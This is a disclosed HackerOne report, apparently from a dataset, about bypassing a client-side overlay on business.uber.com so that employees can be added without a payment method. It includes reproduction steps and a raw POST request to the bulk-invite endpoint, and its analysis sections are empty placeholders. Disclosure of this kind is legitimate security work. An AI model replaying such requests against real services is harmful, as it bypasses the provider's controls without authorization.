---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '153175'
original_report_id: '153175'
title: Can add employee in business.uber.com without add payment method
weakness: Improper Authentication - Generic
team_handle: uber
created_at: '2016-07-22T14:13:47.992Z'
disclosed_at: '2016-07-26T00:27:07.175Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 7
tags:
- hackerone
- improper-authentication-generic
---

# Can add employee in business.uber.com without add payment method

## Metadata

- HackerOne Report ID: 153175
- Weakness: Improper Authentication - Generic
- Program: uber
- Disclosed At: 2016-07-26T00:27:07.175Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

Dear Uber,
I found that modify html from `https://business.uber.com/organization/org-id/employees` can make I create employee without adding payment method.

Step to reproduce:
1. Edit html, remove overlay alert.
2. Create employee in website.

Or:  Use post form:
```
POST /server/organizations/58e3914e-e60f-485d-a3be-1fb7638d648d/employee_invites/bulk_create HTTP/1.1
Host: business.uber.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
x-csrf-token: 1469195077-01-flUszz7Jhwu_gKt84FTlyi-lW3MnyN9eZ4aqQLonGYU
Content-Type: application/json
Referer: https://business.uber.com/organization/58e3914e-e60f-485d-a3be-1fb7638d648d/employees
Content-Length: 70
Cookie: ----
[{"givenName":"Test","familyName":"Testing","email":"phuc@vnoss.org"}]
```

I attach image below as result
Best regard,
Severus

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
